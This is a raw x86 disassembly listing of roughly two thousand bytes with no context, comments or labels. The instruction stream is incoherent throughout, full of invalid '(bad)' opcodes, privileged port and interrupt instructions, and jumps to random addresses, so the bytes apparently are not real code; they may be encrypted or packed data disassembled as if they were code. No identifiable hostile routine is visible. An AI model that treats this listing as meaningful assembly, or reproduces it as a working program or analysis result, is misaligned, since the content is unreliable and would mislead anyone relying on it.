  4025bb:	out    dx,al
  4025bc:	std    
  4025bd:	ret    
  4025be:	test   al,0xb7
  4025c0:	retf   
  4025c1:	out    0xe4,al
  4025c3:	mov    bl,0xc5
  4025c5:	xlat   BYTE PTR ds:[ebx]
  4025c6:	fldl2t 
  4025c8:	out    0xd9,al
  4025ca:	sti    
  4025cb:	retf   0xf7e1
  4025ce:	ret    
  4025cf:	std    
  4025d0:	fdivr  st(5),st
  4025d2:	loopne 0x4025d2
  4025d4:	shr    dl,0xe4
  4025d7:	aam    0xee
  4025d9:	in     eax,dx
  4025da:	or     edi,ecx
  4025dc:	shr    bl,cl
  4025de:	repnz repz (bad) 
  4025e1:	loopne 0x402596
  4025e3:	fidiv  DWORD PTR [edx-0x1b290d2a]
  4025e9:	call   0xfbfddfa7
  4025ee:	jecxz  0x4025d3
  4025f0:	sar    esp,0xd8
  4025f3:	in     al,0xe3
  4025f5:	retf   
  4025f6:	add    edx,edi
  4025f8:	jmp    0xe25f0d9
  4025fd:	lods   eax,DWORD PTR ds:[esi]
  4025fe:	mov    bl,0xd6
  402600:	mov    al,0xb2
  402602:	lock fcomi st,st(2)
  402605:	mov    bh,0xdf
  402607:	out    0xdb,eax
  402609:	mov    edi,0xd9e2fbcc
  40260e:	int3   
  40260f:	jmp    ecx
  402611:	pop    es
  402612:	fcmovbe st,st(0)
  402614:	jmp    0xee432211
  402619:	iret   
  40261a:	aam    0xe8
  40261c:	jecxz  0x4025dd
  40261e:	loopne 0x4025f0
  402620:	enter  0xc8f3,0xfb
  402624:	mov    dl,0xd5
  402626:	sar    BYTE PTR [edi-0x2d2b2216],1
  40262c:	in     al,dx
  40262d:	jecxz  0x402631
  40262f:	sar    BYTE PTR [ebp-0x20014141],0x5
  402636:	add    cl,bh
  402638:	pop    es
  402639:	pop    es
  40263a:	loopne 0x40262b
  40263c:	jmp    esi
  40263e:	in     eax,dx
  40263f:	jecxz  0x402629
  402641:	into   
  402642:	int3   
  402643:	(bad)  
  402644:	mov    al,0xeb
  402646:	enter  0xacbb,0xdf
  40264a:	jmp    0xdbbc:0xd2fbb4de
  402651:	in     al,0xba
  402653:	add    eax,0xe301dee9
  402658:	jmp    0x402639
  40265a:	iret   
  40265b:	fsubp  st(4),st
  40265d:	lock scas al,BYTE PTR es:[edi]
  40265f:	in     al,dx
  402660:	int    0xe6
  402662:	jecxz  0x402629
  402664:	lods   al,BYTE PTR ds:[esi]
  402665:	in     al,dx
  402666:	in     al,0xfe
  402668:	fcmovne st,st(2)
  40266a:	fucomi st,st(7)
  40266c:	mov    eax,0xcdb8d7c8
  402671:	vcmpps ymm0,ymm6,YMMWORD PTR [esi],0xc9
  402676:	(bad)  
  402677:	out    dx,eax
  402678:	hlt    
  402679:	add    ah,ch
  40267b:	clc    
  40267c:	iret   
  40267d:	jmp    0x40264e
  40267f:	test   al,0xf5
  402681:	mov    bh,0xaa
  402683:	int    0xbb
  402685:	mov    ecx,0xcefaf5b2
  40268a:	aad    0xb5
  40268c:	loop   0x40267c
  40268e:	mov    esi,0x7f5dcfa
  402693:	retf   
  402694:	or     edx,ecx
  402696:	jmp    0x9cf:0xcae704e4
  40269d:	loop   0x40268f
  40269f:	ror    al,0xbc
  4026a2:	jmp    0xfece:0xebb2b6c1
  4026a9:	repnz jecxz 0x402684
  4026ac:	cld    
  4026ad:	test   ecx,0xf5d107d3
  4026b3:	repnz hlt 
  4026b5:	leave  
  4026b6:	retf   
  4026b7:	push   cs
  4026b8:	(bad)  
  4026ba:	retf   0xe813
  4026bd:	les    edi,FWORD PTR [ebx+eax*8-0x29493b3d]
  4026c4:	in     al,0xe6
  4026c6:	(bad)  
  4026c7:	(bad)  
  4026c8:	sar    BYTE PTR [esi-0xf290628],1
  4026ce:	(bad)  
  4026d0:	fld    QWORD PTR [esi]
  4026d2:	std    
  4026d3:	in     al,0xd5
  4026d5:	add    eax,edi
  4026d7:	std    
  4026d8:	stc    
  4026d9:	jmp    0xdca8:0xd9c9e1c6
  4026e0:	int3   
  4026e1:	iret   
  4026e2:	ror    dh,cl
  4026e4:	(bad)  
  4026e6:	(bad)  
  4026e7:	repnz in al,dx
  4026e9:	hlt    
  4026ea:	into   
  4026eb:	jmp    0xd90002ef
  4026f0:	jecxz  0x4026ea
  4026f2:	rcl    eax,1
  4026f4:	(bad)  
  4026f5:	jecxz  0x4026fe
  4026f7:	faddp  st(7),st
  4026f9:	dec    BYTE PTR [esi]
  4026fb:	retf   
  4026fc:	pop    es
  4026fd:	stos   DWORD PTR es:[edi],eax
  4026fe:	out    0xe3,al
  402700:	int3   
  402701:	fucomp st(1)
  402703:	(bad)  
  402704:	fld    st(4)
  402706:	shr    bh,1
  402708:	(bad)  
  40270a:	enter  0xf9cc,0xf6
  40270e:	fdivr  st,st(2)
  402710:	fcmovb st,st(6)
  402712:	clc    
  402713:	rol    eax,cl
  402715:	(bad)  
  402716:	leave  
  402717:	jecxz  0x40271c
  402719:	fpatan 
  40271b:	jecxz  0x4026ff
  40271d:	repz jmp 0xe4e4:0xc1bcb6e3
  402725:	mov    cl,0xc7
  402727:	rol    esi,cl
  402729:	shl    ch,cl
  40272b:	mov    ah,0xf4
  40272d:	add    bh,BYTE PTR [edi-0x2d2c2c29]
  402733:	xlat   BYTE PTR ds:[ebx]
  402734:	rol    DWORD PTR [esp+eax*8],1
  402737:	pop    es
  402738:	fdivr  st,st(3)
  40273a:	or     DWORD PTR [edx],ecx
  40273c:	out    dx,al
  40273d:	enter  0xdcbc,0xd7
  402741:	(bad)  
  402742:	sar    bl,1
  402744:	fabs   
  402746:	mov    bh,0xc7
  402748:	stc    
  402749:	in     al,dx
  40274a:	(bad)  
  40274b:	fild   WORD PTR [edx]
  40274d:	fcmovne st,st(4)
  40274f:	stc    
  402750:	in     al,dx
  402751:	repnz clc 
  402753:	in     al,0x6
  402755:	jmp    0xcc071c20
  40275a:	out    dx,al
  40275b:	psubsw mm0,mm3
  40275e:	test   eax,0xe0c3b3a5
  402763:	in     eax,dx
  402764:	mov    dl,0xed
  402766:	stc    
  402767:	(bad)  
  402768:	lods   al,BYTE PTR ds:[esi]
  402769:	(bad)  
  40276a:	icebp  
  40276b:	iret   
  40276c:	jmp    0xfabc:0x6bdd0df
  402773:	(bad)  
  402774:	fmul   DWORD PTR [eax]
  402776:	ror    BYTE PTR [eax],0xd4
  402779:	out    dx,al
  40277a:	or     cl,al
  40277c:	or     cl,al
  40277e:	into   
  40277f:	repnz cmc 
  402781:	hlt    
  402782:	mov    bl,0xf2
  402784:	call   0xf811fe7f
  402789:	mov    dh,0xd1
  40278b:	mov    eax,0xd6c8f1ef
  402790:	mov    DWORD PTR ds:0xe505f7e5,0xcb07d9d9
  40279a:	jmp    0x4027ab
  40279c:	(bad)  
  40279e:	mov    ebp,0xb2e2e1b2
  4027a3:	shl    DWORD PTR [ebx-0x48153a2f],1
  4027a9:	fsincos 
  4027ab:	leave  
  4027ac:	rcl    esp,1
  4027ae:	mov    esi,0xc4010601
  4027b3:	clc    
  4027b4:	cld    
  4027b5:	xlat   BYTE PTR ds:[ebx]
  4027b6:	ror    BYTE PTR [ebx],1
  4027b8:	mov    esp,0x8edeb01
  4027bd:	shl    ebp,0xc1
  4027c0:	jmp    0x40276f
  4027c2:	shr    cl,0xcc
  4027c5:	cli    
  4027c6:	into   
  4027c7:	fucomip st,st(0)
  4027c9:	icebp  
  4027ca:	fdiv   DWORD PTR [eax+edi*4-0x2b0b0947]
  4027d1:	in     eax,dx
  4027d2:	dec    DWORD PTR [ebx]
  4027d4:	add    eax,0x2efd000
  4027d9:	add    al,ch
  4027db:	add    edi,ecx
  4027dd:	int3   
  4027de:	out    0xb3,eax
  4027e0:	in     al,dx
  4027e1:	ret    
  4027e2:	int3   
  4027e3:	shl    cl,0xd7
  4027e6:	shr    edi,1
  4027e8:	sar    BYTE PTR [esi-0xd232616],1
  4027ee:	out    dx,eax
  4027ef:	test   eax,0x4fad7cc
  4027f5:	sar    esp,1
  4027f7:	fcmovne st,st(1)
  4027f9:	std    
  4027fa:	int    0x1
  4027fc:	loop   0x4027df
  4027fe:	loopne 0x4027f1
  402800:	ret    
  402801:	shr    dl,0xe3
  402804:	loopne 0x4027fa
  402806:	(bad)  
  402807:	ror    bh,cl
  402809:	vpaddusw ymm5,ymm6,ymm4
  40280d:	xlat   BYTE PTR ds:[ebx]
  40280e:	add    dh,bl
  402810:	clc    
  402811:	int    0xf5
  402813:	clc    
  402814:	add    ah,bl
  402816:	fcmove st,st(1)
  402818:	aam    0xd8
  40281a:	cli    
  40281b:	jmp    0xcfc4:0xb2e0b30c
  402822:	shr    esi,cl
  402824:	jmp    0xb9c8:0xcefafabb
  40282b:	rcr    ch,cl
  40282d:	aad    0xbe
  40282f:	push   es
  402830:	mov    esp,0xbcd70bdf
  402835:	fmulp  st(1),st
  402837:	leave  
  402838:	add    eax,0xd80ddc0e
  40283d:	lock mov ebp,0xacb0c5f1
  402843:	jmp    0xccb4:0xd5b9c8c8
  40284a:	fucomi st,st(1)
  40284c:	(bad)  
  40284e:	aam    0xd9
  402850:	repnz aam 0xbc
  402853:	fmul   DWORD PTR [ebx]
  402855:	jecxz  0x40281c
  402857:	jmp    0x402864
  402859:	vpsubd xmm3,xmm6,xmm6
  40285d:	loope  0x40281f
  40285f:	rol    ebx,cl
  402861:	(bad)  
  402862:	sti    
  402863:	jmp    0xd7ce:0xf7c5eff7
  40286a:	retf   
  40286b:	mov    edi,0xdabde3ee
  402870:	in     eax,0xec
  402872:	add    esi,eax
  402874:	add    bh,ch
  402876:	hlt    
  402877:	cld    
  402878:	retf   
  402879:	fcmovnb st,st(4)
  40287b:	in     eax,0xed
  40287d:	ret    
  40287e:	iret   
  40287f:	out    dx,al
  402880:	jmp    0x402852
  402882:	lods   eax,DWORD PTR ds:[esi]
  402883:	(bad)  
  402884:	call   0xeafc1178
  402889:	mov    ebp,0x2dfd2ce
  40288e:	out    dx,eax
  40288f:	fld    st(2)
  402891:	in     al,dx
  402892:	out    0xb,eax
  402894:	loopne 0x402879
  402896:	leave  
  402897:	or     BYTE PTR [esp+eax*8],al
  40289a:	jmp    eax
  40289c:	jmp    0xb2e2:0xeca9aab9
  4028a3:	retf   0xe1e8
  4028a6:	stc    
  4028a7:	jmp    0xc1e8:0xcccae8b4
  4028ae:	repz fiadd DWORD PTR [edi]
  4028b1:	(bad)  
  4028b3:	cmc    
  4028b4:	cld    
  4028b5:	out    0x8,eax
  4028b7:	out    dx,al
  4028b8:	iret   
  4028b9:	fcmovnu st,st(3)
  4028bb:	loop   0x4028a6
  4028bd:	fmulp  st(5),st
  4028bf:	mov    dl,0xde
  4028c1:	jmp    0x4028ab
  4028c3:	jmp    0xcb1affaa
  4028c8:	stc    
  4028c9:	(bad)  
  4028ca:	fprem1 
  4028cc:	fidiv  DWORD PTR [edi-0xd3e2b02]
  4028d2:	rcr    bh,cl
  4028d4:	or     edx,esp
  4028d6:	ret    0xc9c1
  4028d9:	dec    ecx
  4028db:	repz stc 
  4028dd:	mov    dl,0xf2
  4028df:	mov    esp,0xf1dbccaf
  4028e4:	fisubr DWORD PTR [edi-0x36275248]
  4028ea:	aam    0xfd
  4028ec:	rol    dl,1
  4028ee:	(bad)  
  4028f0:	cld    
  4028f1:	jecxz  0x4028f8
  4028f3:	jecxz  0x4028c9
  4028f5:	icebp  
  4028f6:	out    dx,eax
  4028f7:	fmulp  st(7),st
  4028f9:	aam    0xd4
  4028fb:	in     eax,dx
  4028fc:	cld    
  4028fd:	(bad)  
  4028ff:	mov    bh,0xe1
  402901:	bnd ret 
  402903:	in     eax,dx
  402904:	mov    cl,0xf8
  402906:	rcr    bl,cl
  402908:	clc    
  402909:	mov    ah,0xb9
  40290b:	ret    
  40290c:	jmp    0xddff:0xf707d0ff
  402913:	sar    al,0xe4
  402916:	enter  0xe6da,0xe3
  40291a:	or     eax,0xefece7cb
  40291f:	icebp  
  402920:	retf   0xd6e6
  402923:	mov    eax,0xacb4b0fa
  402929:	xlat   BYTE PTR ds:[ebx]
  40292a:	lock in al,dx
  40292c:	(bad)  
  40292d:	repz mov ecx,0xd8ed02df
  402933:	ret    0x2fc
  402936:	add    al,0xff
  402938:	rcr    dh,0xee
  40293b:	int3   
  40293c:	retf   0xcce7
  40293f:	out    0xce,eax
  402941:	mov    cl,0xe1
  402943:	out    0xfa,eax
  402945:	not    ebp
  402947:	out    0xe8,al
  402949:	(bad)  
  40294a:	in     al,dx
  40294b:	in     eax,dx
  40294c:	add    esp,ecx
  40294e:	mov    edi,0xc6bfffed
  402953:	(bad)  
  402954:	fdivrp st(5),st
  402956:	aam    0xe8
  402958:	(bad)  
  40295a:	jmp    0xdec2:0xe8cd0fca
  402961:	out    dx,al
  402962:	out    0xf5,eax
  402964:	ret    0xbbe9
  402967:	call   0xfdf72322
  40296c:	lock mov ebp,0xdbbed5fd
  402972:	hlt    
  402973:	push   es
  402974:	out    0xe8,eax
  402976:	(bad)  
  402977:	std    
  402978:	lds    ecx,FWORD PTR [esi]
  40297a:	add    ecx,esi
  40297c:	jmp    0xe0b2:0xd2c5c3ab
  402983:	mov    al,0xcf
  402985:	mov    bh,0xdb
  402987:	lock out 0xde,al
  40298a:	(bad)  
  40298c:	rol    dl,1
  40298e:	int    0xfc
  402990:	rcl    esp,cl
  402992:	cli    
  402993:	xlat   BYTE PTR ds:[ebx]
  402994:	clc    
  402995:	sar    eax,1
  402997:	out    dx,al
  402998:	cmc    
  402999:	lds    eax,FWORD PTR [ecx]
  40299b:	fchs   
  40299d:	lock fistp QWORD PTR [esi-0x3d2c0e1c]
  4029a4:	mov    ch,0xf1
  4029a6:	div    ecx
  4029a8:	in     eax,dx
  4029a9:	div    bh
  4029ab:	rcr    ch,cl
  4029ad:	cld    
  4029ae:	into   
  4029af:	cmc    
  4029b0:	clc    
  4029b1:	test   esp,0xd9f5c3e3
  4029b7:	test   ebp,0xe8cf0cfc
  4029bd:	retf   0xacdd
  4029c0:	out    dx,eax
  4029c1:	mov    dh,0xe4
  4029c3:	repz in al,dx
  4029c5:	leave  
  4029c6:	not    bh
  4029c8:	mov    ah,0xcf
  4029ca:	mov    ah,0xfb
  4029cc:	jmp    0xde47f6cf
  4029d1:	cmc    
  4029d2:	mov    ebp,0xd709fcc3
  4029d7:	(bad)  
  4029d8:	jmp    0x4029e4
  4029da:	loopne 0x4029a4
  4029dc:	stc    
  4029dd:	test   al,0xc6
  4029df:	ret    
  4029e0:	(bad)  
  4029e1:	retf   0xc3d0
  4029e4:	mov    edx,0xd0efb2d0
  4029e9:	mov    ebp,0xccb8bedf
  4029ee:	add    ebp,edx
  4029f0:	fdivr  st(3),st
  4029f2:	jmp    0x4029e4
  4029f4:	lds    eax,FWORD PTR [ebx]
  4029f6:	hlt    
  4029f7:	pmaxub mm4,mm1
  4029fa:	sti    
  4029fb:	add    al,0xf
  4029fd:	mov    ebp,0xafe0efcc
  402a02:	jecxz  0x4029d1
  402a04:	mov    ah,0xf7
  402a06:	sti    
  402a07:	jmp    0xc2cf:0xcbf9ddba
  402a0e:	fadd   st(3),st
  402a10:	mov    esp,0xc7dedffb
  402a15:	or     ah,ah
  402a17:	aam    0xf6
  402a19:	add    eax,DWORD PTR [eax]
  402a1b:	dec    edx
  402a1d:	fsub   st,st(6)
  402a1f:	scas   eax,DWORD PTR es:[edi]
  402a20:	loopne 0x4029f8
  402a22:	mov    al,0xc8
  402a24:	aad    0xf2
  402a26:	repz jmp 0xdf0c1724
  402a2c:	mov    ebx,0xdaedcdde
  402a31:	hlt    
  402a32:	jecxz  0x402a16
  402a34:	in     eax,0x8
  402a36:	lds    ecx,FWORD PTR [esi]
  402a38:	out    0xcf,eax
  402a3a:	cli    
  402a3b:	retf   
  402a3c:	jmp    0x402a1e
  402a3e:	sar    DWORD PTR [ebp-0x1d3c101f],cl
  402a44:	loope  0x402a21
  402a46:	in     al,0xca
  402a48:	in     al,dx
  402a49:	hlt    
  402a4a:	div    ebp
  402a4c:	lock fidivr DWORD PTR [edx-0x38292f01]
  402a53:	or     eax,ebx
  402a55:	stc    
  402a56:	hlt    
  402a57:	add    eax,0xc4c6e3fc
  402a5c:	out    dx,al
  402a5d:	shl    ebp,cl
  402a5f:	test   eax,0xcafbebc9
  402a64:	not    edi
  402a66:	loopne 0x402a23
  402a68:	lds    edi,FWORD PTR [edx+0x3f0eeec]
  402a6e:	repnz cmc 
  402a70:	mov    ah,0xdd
  402a72:	mov    esi,0xd6e9d70b
  402a77:	retf   
  402a78:	hlt    
  402a79:	jmp    0xa8230481
  402a7e:	leave  
  402a7f:	mov    edx,0xc0ebd6c6
  402a85:	(bad)  
  402a86:	in     al,0xea
  402a88:	out    dx,eax
  402a89:	hlt    
  402a8a:	icebp  
  402a8b:	mov    ebx,0xf5edfdbf
  402a90:	pop    es
  402a91:	fyl2xp1 
  402a93:	not    cl
  402a95:	loop   0x402a8b
  402a97:	out    dx,al
  402a98:	iret   
  402a99:	sti    
  402a9a:	out    dx,al
  402a9b:	adc    ebp,edi
  402a9d:	shl    BYTE PTR [edx-0x1c4f2c1f],1
  402aa3:	call   0xd3f82395
  402aa8:	div    esp
  402aaa:	les    edi,FWORD PTR [eax-0x1c490c01]
  402ab0:	mov    edi,0xd0dddff3
  402ab5:	rol    BYTE PTR [eax],0xe1
  402ab8:	fabs   
  402aba:	pinsrw mm5,eax,0xec
  402abe:	into   
  402abf:	scas   al,BYTE PTR es:[edi]
  402ac0:	mov    al,0xc5
  402ac2:	mov    esp,0xbaf2cad4
  402ac7:	(bad)  
  402ac8:	out    dx,al
  402ac9:	mov    dh,0xfd
  402acb:	sar    ah,1
  402acd:	icebp  
  402ace:	fcmovnb st,st(3)
  402ad0:	repnz sar cl,1
  402ad3:	fiadd  WORD PTR [ecx]
  402ad5:	add    al,0xca
  402ad7:	hlt    
  402ad8:	aad    0xfd
  402ada:	stc    
  402adb:	fiadd  DWORD PTR ds:0xd1eeccc1
  402ae1:	lods   al,BYTE PTR ds:[esi]
  402ae2:	loop   0x402ab1
  402ae4:	repnz rcl cl,cl
  402ae7:	int    0xd2
  402ae9:	in     eax,0xdc
  402aeb:	fbstp  TBYTE PTR [ecx+ebp*8-0x1fcff28]
  402af2:	in     al,0xd4
  402af4:	fisttp WORD PTR [edx]
  402af6:	pop    es
  402af7:	out    0xea,al
  402af9:	jmp    0xeece:0xdfe107dc
  402b00:	out    0xb1,eax
  402b02:	xlat   BYTE PTR ds:[ebx]
  402b03:	sar    DWORD PTR [edx-0x1b4a0445],1
  402b09:	rcl    eax,1
  402b0b:	sti    
  402b0c:	out    dx,eax
  402b0d:	mov    edx,0xbfc3f202
  402b12:	push   es
  402b13:	in     eax,0xd0
  402b15:	in     al,0xb
  402b17:	fmul   DWORD PTR [edx]
  402b19:	loop   0x402af8
  402b1b:	(bad)  
  402b1c:	jmp    0x402acc
  402b1e:	(bad)  
  402b1f:	in     al,dx
  402b20:	in     eax,0xe5
  402b22:	iret   
  402b23:	loop   0x402b15
  402b25:	xlat   BYTE PTR ds:[ebx]
  402b26:	int3   
  402b27:	clc    
  402b28:	leave  
  402b29:	cmc    
  402b2a:	cli    
  402b2b:	jmp    0x402afb
  402b2d:	fucomi st,st(7)
  402b2f:	in     al,dx
  402b30:	ret    
  402b31:	ffree  st(3)
  402b33:	fucom  st(1)
  402b35:	lock add DWORD PTR [edi],ecx
  402b38:	out    dx,eax
  402b39:	in     al,dx
  402b3a:	loopne 0x402b06
  402b3c:	(bad)  
  402b3e:	rcl    esi,cl
  402b40:	mov    cl,0xd0
  402b42:	aad    0xcd
  402b44:	int    0xec
  402b46:	call   0xcb101b2a
  402b4b:	repz std 
  402b4d:	leave  
  402b4e:	iret   
  402b4f:	fld    st(0)
  402b51:	cld    
  402b52:	clc    
  402b53:	icebp  
  402b54:	in     eax,0xe9
  402b56:	imul   dh
  402b58:	out    dx,eax
  402b59:	out    dx,al
  402b5a:	push   cs
  402b5b:	push   es
  402b5c:	add    al,0xe0
  402b5e:	jmp    0xecd3:0xd4e5cae6
  402b65:	aam    0xe9
  402b67:	repz out dx,al
  402b69:	jmp    0xd4240743
  402b6e:	clc    
  402b6f:	add    edx,ebx
  402b71:	push   edx
  402b73:	or     ecx,DWORD PTR [ecx]
  402b75:	test   DWORD PTR [edi],0xc9e603df
  402b7b:	jmp    0xb2dc:0xd7adbc02
  402b82:	lods   eax,DWORD PTR ds:[esi]
  402b83:	lods   eax,DWORD PTR ds:[esi]
  402b84:	cli    
  402b85:	stc    
  402b86:	mov    ch,0xb1
  402b88:	(bad)  
  402b89:	out    dx,al
  402b8a:	mov    eax,0xf2bdec03
  402b8f:	int3   
  402b90:	sar    DWORD PTR [edi+edi*8-0x1d1a1ef5],1
  402b97:	or     al,bl
  402b99:	jecxz  0x402ba0
  402b9b:	int    0xe8
  402b9d:	leave  
  402b9e:	int    0xbe
  402ba0:	jecxz  0x402b4d
  402ba2:	mov    ah,0xac
  402ba4:	fidiv  DWORD PTR [ebp-0x463a473c]
  402baa:	cld    
  402bab:	cli    
  402bac:	in     al,dx
  402bad:	out    dx,al
  402bae:	mov    esp,0xbdfebefc
  402bb3:	loop   0x402bb6
  402bb5:	neg    eax
  402bb7:	fiadd  WORD PTR [edx+edi*8]
  402bba:	cld    
  402bbb:	out    dx,al
  402bbc:	call   0xeceeeb68
  402bc1:	ret    0xedec
  402bc4:	loopne 0x402bb5
  402bc6:	mov    eax,0xe3d6ffd6
  402bcb:	jmp    0xdcc6:0xf9dbfddf
  402bd2:	loop   0x402bae
  402bd4:	pop    es
  402bd5:	loop   0x402bb4
  402bd7:	in     al,0xd5
  402bd9:	clc    
  402bda:	adc    eax,DWORD PTR [ecx]
  402bdc:	repz iret 
  402bde:	out    0xf2,eax
  402be0:	test   al,0xb0
  402be2:	int    0xce
  402be4:	in     al,dx
  402be5:	cmc    
  402be6:	lds    esi,FWORD PTR [edi-0x232a2530]
  402bec:	mov    esp,0xf2eec0fb
  402bf1:	(bad)  
  402bf4:	out    0xdb,eax
  402bf6:	retf   
  402bf7:	fmul   st(6),st
  402bf9:	jecxz  0x402c02
  402bfb:	jecxz  0x402c10
  402bfd:	out    dx,eax
  402bfe:	shl    bh,cl
  402c00:	loopne 0x402bf1
  402c02:	int    0xa9
  402c04:	repz (bad) 
  402c08:	(bad)  
  402c09:	mov    ch,0xdf
  402c0b:	repz div esi
  402c0e:	repnz pop es
  402c10:	lock loopne 0x402bf8
  402c13:	fadd   st,st(0)
  402c15:	loop   0x402c0d
  402c17:	jmp    0x92d1a1c
  402c1c:	retf   
  402c1d:	mov    dl,0xe4
  402c1f:	iret   
  402c20:	lods   eax,DWORD PTR ds:[esi]
  402c21:	into   
  402c22:	mov    al,0xa9
  402c24:	test   al,0xf1
  402c26:	imul   DWORD PTR [ebp-0x1444034c]
  402c2c:	into   
  402c2d:	loope  0x402bf0
  402c2f:	bnd ret 0xbce3
  402c33:	repnz fimul DWORD PTR [ecx]
  402c36:	loop   0x402c2f
  402c38:	in     eax,dx
  402c39:	add    bl,cl
  402c3b:	int    0xf1
  402c3d:	ror    al,0xd7
  402c40:	shl    edx,0xc6
  402c43:	into   
  402c44:	int    0xb3
  402c46:	into   
  402c47:	int    0xc8
  402c49:	icebp  
  402c4a:	icebp  
  402c4b:	jecxz  0x402c29
  402c4d:	repnz icebp 
  402c4f:	lock mov ebp,0xaf8ebf2
  402c55:	(bad)  
  402c56:	out    dx,eax
  402c57:	push   cs
  402c58:	iret   
  402c59:	aam    0xb
  402c5b:	loop   0x402c3f
  402c5d:	(bad)  
  402c5e:	out    dx,al
  402c5f:	(bad)  
  402c60:	lock out 0xb2,eax
  402c63:	repnz mov dh,0xbb
  402c66:	sti    
  402c67:	iret   
  402c68:	fsubr  st,st(4)
  402c6a:	shl    edi,cl
  402c6c:	ffreep st(3)
  402c6e:	mov    edx,0xc1c2c3fa
  402c73:	in     al,0xfc
  402c75:	(bad)  
  402c76:	out    dx,eax
  402c77:	cld    
  402c78:	cmc    
  402c79:	pop    es
  402c7a:	stc    
  402c7b:	add    eax,0xd6a6eb0d
  402c80:	loope  0x402c6f
  402c82:	enter  0xf4ac,0xf7
  402c86:	(bad)  
  402c87:	repnz (bad) 
  402c89:	stc    
  402c8a:	(bad)  
  402c8b:	mov    ebp,0xbdd0e8bb
  402c90:	in     al,dx
  402c91:	loope  0x402c66
  402c93:	mov    ecx,0xf9c0e304
  402c98:	fadd   QWORD PTR [esi+ecx*1]
  402c9b:	retf   
  402c9c:	push   es
  402c9d:	scas   al,BYTE PTR es:[edi]
  402c9e:	mov    edi,0xd6c6f5a5
  402ca3:	icebp  
  402ca4:	loope  0x402c9b
  402ca6:	fdivr  DWORD PTR [ebx-0x4741010f]
  402cac:	fcompp 
  402cae:	add    edx,ecx
  402cb0:	rcl    ah,cl
  402cb2:	aam    0xea
  402cb4:	rol    BYTE PTR [esi],1
  402cb6:	jecxz  0x402c96
  402cb8:	loopne 0x402c80
  402cba:	aam    0xfb
  402cbc:	(bad)  
  402cbd:	fcomip st,st(2)
  402cbf:	in     al,0xc5
  402cc1:	shl    bl,0xb6
  402cc4:	leave  
  402cc5:	aad    0xd3
  402cc7:	cmc    
  402cc8:	fucomip st,st(6)
  402cca:	icebp  
  402ccb:	hlt    
  402ccc:	iret   
  402ccd:	aam    0xec
  402ccf:	icebp  
  402cd0:	(bad)  
  402cd1:	add    esp,eax
  402cd3:	aam    0xe4
  402cd5:	cmc    
  402cd6:	out    0xf,eax
  402cd8:	add    eax,0xe2e7cfca
  402cdd:	les    ebp,FWORD PTR [edx-0x1f510c43]
  402ce3:	leave  
  402ce4:	shl    ch,0xd0
  402ce7:	leave  
  402ce8:	mov    esi,0xcae2f5b3
  402ced:	add    ecx,esp
  402cef:	rcl    eax,0xd0
  402cf2:	lock lock clc 
  402cf5:	stc    
  402cf6:	ror    BYTE PTR [ebx],0xcb
  402cf9:	push   es
  402cfa:	loop   0x402cef
  402cfc:	add    cl,al
  402cfe:	into   
  402cff:	into   
  402d00:	(bad)  
  402d01:	mov    dl,0xef
  402d03:	(bad)  
  402d04:	jmp    0x402ccb
  402d06:	jmp    0xc90b23ca
  402d0b:	fadd   QWORD PTR [ecx]
  402d0d:	mov    esi,0xdedeeebf
  402d12:	clc    
  402d13:	(bad)  
  402d14:	(bad)  
  402d15:	cmc    
  402d16:	hlt    
  402d17:	jmp    0xc50c14f7
  402d1c:	cli    
  402d1d:	loop   0x402d02
  402d1f:	lods   eax,DWORD PTR ds:[esi]
  402d20:	iret   
  402d21:	out    0xd4,eax
  402d23:	(bad)  
  402d24:	mov    edx,0xf4f1d1f9
  402d29:	jmp    0xe2240826
  402d2e:	mov    esi,0xfcf5e106
  402d33:	in     al,0xf7
  402d35:	ffree  st(6)
  402d37:	lds    eax,FWORD PTR [eax]
  402d39:	fmul   QWORD PTR [edi]
  402d3b:	in     al,0xda
  402d3d:	lods   eax,DWORD PTR ds:[esi]
  402d3e:	mov    cl,0xcc
  402d40:	shl    ecx,0xc9
  402d43:	in     eax,0xf1
  402d45:	mov    dl,0xb7
  402d47:	int3   
  402d48:	std    
  402d49:	(bad)  
  402d4b:	jmp    0xc0bf:0xee07c8ee
  402d52:	(bad)  
  402d53:	loopne 0x402d57
  402d55:	or     bh,al
  402d57:	fdiv   st,st(4)
  402d59:	out    dx,al
  402d5a:	or     ah,ah
  402d5c:	ffreep st(0)
  402d5e:	fbstp  TBYTE PTR [eax-0x25342b0a]
  402d64:	lods   al,BYTE PTR ds:[esi]
  402d65:	not    cl
  402d67:	fcmovnbe st,st(4)
  402d69:	lock icebp 
  402d6b:	mov    esp,0xf6d0eedd
  402d70:	fld    QWORD PTR [edx]
  402d72:	fcmovu st,st(5)
  402d74:	clc    
  402d75:	fcmovu st,st(1)
  402d77:	fadd   DWORD PTR [ecx]
  402d79:	or     BYTE PTR [edx],cl
  402d7b:	loope  0x402d7d
  402d7d:	leave  
  402d7e:	retf   
  402d7f:	out    0xf6,al
  402d81:	mov    bh,0xcf
  402d83:	shr    dl,1
  402d85:	mov    ecx,0xdcfef9e9
  402d8a:	into   
  402d8b:	into   
  402d8c:	aam    0xdb
  402d8e:	fiadd  DWORD PTR [ecx]
  402d90:	aam    0xbf
  402d92:	in     al,0xf0
  402d94:	loop   0x402d55
  402d96:	or     esp,ebx
  402d98:	push   cs
  402d99:	enter  0x1ec,0xf2
  402d9d:	icebp  
  402d9e:	(bad)  
  402d9f:	in     al,0xb1
  402da1:	shr    ebx,1
  402da3:	(bad)  
  402da4:	xlat   BYTE PTR ds:[ebx]
  402da5:	int    0xc7
  402da7:	out    dx,eax
  402da8:	int3   
  402da9:	mov    bl,0xbc
  402dab:	clc    
  402dac:	out    dx,al
  402dad:	mov    edi,0xbcf2eff5
  402db2:	hlt    
  402db3:	div    ch
  402db5:	imul   cl
  402db7:	or     bh,dh
  402db9:	fstp   st(7)
  402dbb:	fucom  st(2)
  402dbd:	mov    edi,0xc1eae4c1
  402dc2:	iret   
  402dc3:	in     eax,0xe7
  402dc5:	mov    cl,0xee
  402dc7:	(bad)  
  402dc9:	mov    edx,0x1bb02de
  402dce:	mov    ebp,0xe0dec2e3
  402dd3:	(bad)  
  402dd4:	cli    
  402dd5:	fstp   st(0)
  402dd7:	(bad)  
  402dd8:	add    eax,0xdd01edfa
  402ddd:	loopne 0x402d89
  402ddf:	lods   al,BYTE PTR ds:[esi]
  402de0:	in     eax,0xf1
  402de2:	mov    dh,0xd1
  402de4:	into   
  402de5:	iret   
  402de6:	mov    ch,0xdb
  402de8:	rcl    eax,cl
  402dea:	faddp  st(3),st
  402dec:	add    esi,ebx
  402dee:	(bad)  
  402def:	loop   0x402dae
  402df1:	int    0x1
